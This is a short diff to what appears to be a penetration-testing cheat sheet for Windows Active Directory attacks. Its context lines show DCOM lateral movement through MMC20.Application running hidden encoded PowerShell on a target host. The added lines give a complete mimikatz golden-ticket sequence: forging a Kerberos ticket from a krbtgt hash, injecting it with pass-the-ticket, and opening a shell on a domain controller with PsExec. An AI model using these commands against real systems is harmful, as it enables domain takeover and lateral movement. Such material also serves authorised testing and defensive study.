@@ -268,3 +268,13 @@ DCOM:
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$TARGET_IP"))
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB....","7")
 ```
+
+Golden ticket:
+```powershell
+#start mimikatz
+privilege::debug
+kerberos::purge
+kerberos::golden /user:$USER /domain:$TARGET_AD /sid:$TARGET_SID /krbtgt:$HASH /ptt
+misc::cmd
+PsExec.exe \\$DOMAIN_CONTROLLER cmd.exe
+```
